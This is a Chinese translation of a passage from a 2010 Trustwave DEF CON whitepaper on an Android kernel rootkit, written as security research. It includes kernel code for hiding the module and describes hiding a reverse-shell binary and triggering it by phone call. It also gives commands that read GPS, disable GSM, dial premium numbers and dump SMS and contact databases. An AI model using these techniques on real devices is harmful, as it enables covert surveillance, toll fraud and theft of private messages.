**版权 © 2010 Trustwave。保留所有权利。**

**DEF CON 18 白皮书，2010年7月**

### 5.2 隐藏于用户和操作系统

我们的rootkit的一个缺点是会在文件系统上留下一个单独的二进制文件，即反向shell二进制文件。我们可以通过劫持`sys_getdents`系统调用来隐藏`/data/local/shell`二进制文件的存在，从而使其在目录列表中不可见。

与感染普通PC不同，移动设备存在一些特定的挑战。其中之一是持久性问题。移动设备经常重启，这意味着我们必须有一种机制来重新加载内核模块。一种方法是在`init.d`脚本中插入`insmod`指令。另一种更为优雅的方法是感染现有的内核模块，使得当Wi-Fi开启时，rootkit代码会首先执行。然而，HTC已经采取了多种措施确保`init.d`文件所在的分区和其他模块都是只读的。由于我们没有其他设备来进行进一步测试，因此唯一可行的持久化方式是重新感染。

隐藏模块本身的方法与其他Linux rootkit相同，以下代码可以实现这一功能：

```c
static void hide_module(void) {
    __this_module.list.prev->next = __this_module.list.next;
    __this_module.list.next->prev = __this_module.list.prev;
    __this_module.list.next = LIST_POISON1;
    __this_module.list.prev = LIST_POISON2;
}
```

这样做的结果是，该模块不会出现在`lsmod`输出中，即它看起来并没有被加载。

```
# lsmod
# insmod rootkit.ko
# lsmod
#
```

下一节将描述上述内容的影响，并引导读者了解我们测试的一些滥用场景。

### 5.3 影响

通过从触发号码拨打受感染的手机，可以启动一个通过Wi-Fi或3G的反向TCP shell连接到攻击者。从这里开始，攻击者可以完全与Android移动设备进行交互。

我们成功执行的一些滥用场景包括：

1. 通过查询GPS子系统`/dev/smd27`获取GPS坐标。
2. 关闭GSM通信。
3. 发起对潜在高费率号码的幻影呼叫。
4. 从手机中检索SMS数据库。

#### 获取GPS坐标

通过从`/dev/smd27`读取NMEA数据来获取GPS坐标：

```
# cat /dev/smd27
$GPGSV,4,1,16,03,02,289,,05,07,035,,06,17,291,,15,,,*43
$GPGSV,4,2,16,16,45,309,,18,37,150,,21,84,327,,22,13,180,*7F
$GPGSV,4,3,16,24,42,234,,29,41,077,,30,17,150,,31,18,227,*7F
$GPGSV,4,4,16,32,,,,28,,,,27,,,,26,,,*74
$GPGGA,,,,,,0,,,,,,,,*66
...
```

#### 关闭GSM通信

```
echo -e 'AT+CFUN=0\r' > /dev/smd0
```

#### 发起对潜在高费率号码的幻影呼叫

```
echo -e 'ATD02073734844;\r' > /dev/smd0
```

#### 一些有趣的SQLite3数据库

- `./data/com.google.android.providers.gmail/databases/mailstore.user@gmail.com.db`
- `./data/com.android.providers.telephony/databases/mmssms.db`
- `./data/com.android.providers.contacts/databases/contacts2.db`

#### 检索SMS消息

```
# sqlite3 ./data/com.android.providers.telephony/databases/mmssms.db
SQLite version 3.5.9
Enter ".help" for instructions
sqlite> .tables
addr                 htcmsgs              qtext 
android_metadata     htcthreads           rate 
attachments          incoming_msg         raw 
canonical_addresses  part                 sms 
cbch                 pdu                  sr_pending 
drm                  pending_msgs         threads 
sqlite> select * from sms;
175|1|145|+44xxxxxx|176|1276176208000|0|1|-
1|1|0||test1|0||+447802000332|0|-1||0 
176|1|0|+447xxxxxx||1276195271967||1|-1|2|||test2|0|||0|-1||0 
177|1|145|+447xxxxx|176|1276195359000|0|1|-
1|1|0||test3|0||+447802000332|0|-1||0 
```

然而，这些滥用场景远非详尽无遗，仅受限于想象力和意图。

### 6 结论

总之，我们展示了为Google Android平台编写Linux内核rootkit的可能性。我们成功编译了名为Mindtrick的rootkit，并劫持了系统调用。通过系统调用调试，我们发现了相关的电话功能，并对其进行了劫持和监控以检测某些触发事件。

一旦这些触发事件发生，我们就可以向攻击者发送一个通过Wi-Fi或3G的反向TCP shell。从这里开始，攻击者可以完全控制目标设备。我们演示了在获得完整TTY访问权限后，攻击者可以检索GPS坐标、关闭GSM通信、发起对潜在高费率号码的幻影呼叫以及读取手机的SMS数据库。

然而，这个列表远非详尽无遗，仅受限于想象力和意图。我们相信其他研究人员能够执行更多功能，使这种攻击更加实用。我们探索但未实现的想法包括记录通话、针对浏览器活动的中间人攻击、任意录制来自手机麦克风或摄像头的内容，甚至剥离并检索电子邮件附件。

唯一的限制是硬件和操作系统在最低层允许的功能。

这是一次对流行消费和商业设备的技术探索。在1990年代末期，像Back Orifice这样的工具发布，引起了企业高管们的广泛关注，他们开始思考如果有人能够访问他们的Windows桌面、查看文件、阅读电子邮件甚至通过PC麦克风监听将会带来什么影响。这些担忧引发了保护环境免受此类攻击的工具的大规模扩展和发展。

在1990年代末期，智能手机尚未出现；大多数消费者还没有拥有手机。当时，人们认为一个人随身携带一款具有持续高速互联网连接的小型通信设备，并且其生产力超过当时的PC，只是科幻小说中的情节。

与过去（甚至是现在PC恶意软件的发展趋势）类似，智能手机市场的快速增长，尤其是开源手机平台的快速增长，意味着犯罪分子将迅速通过这些渠道发起攻击。面对这样的威胁，需要开发相应的缓解措施来确保移动计算的未来安全。

### 7 参考文献

1. Google. Android Architecture. [Online] [Cited: 06 11, 2010.] http://developer.android.com/guide/basics/what-is-android.html.
2. Wikipedia. Dalvik (software). [Online] 2010. [Cited: 06 11, 2010.] http://en.wikipedia.org/wiki/Dalvik_%28software%29.
3. Morgan Stanley Research. The Mobile Internet Report. s.l. : Morgan Stanley, 2009.
4. Gleave, Stephen. The mechanics of lawful interception. 5, s.l. : Network Security, 2007, Vol. 2007.
5. BBC News. UAE Blackberry update was spyware. [Online] 2009. [Cited: 06 10, 2010.] http://news.bbc.co.uk/2/hi/technology/8161190.stm.
6. Collin Mulliner, Charlie Miller. Fuzzing the phone in your phone. Las Vegas : Black Hat USA 2009, 2009.
7. Zovi, Dino Dai. Kernel Rootkits. s.l. : Sandia National Laboratories, 2001.
8. sd, devik. Linux on-the-fly kernel patching without LKM. Phrack. 2001, Vol. 11, 58.
9. The Linux Documentation Project. The Linux Kernel Module Programming Guide. [Online] [Cited: 06 14, 2010.] http://tldp.org/LDP/lkmpg/2.6/html/x380.html.
10. ETSI. AT command set for User Equipment. Paris : s.n., 2010.

**版权 © 2010 Trustwave。保留所有权利。**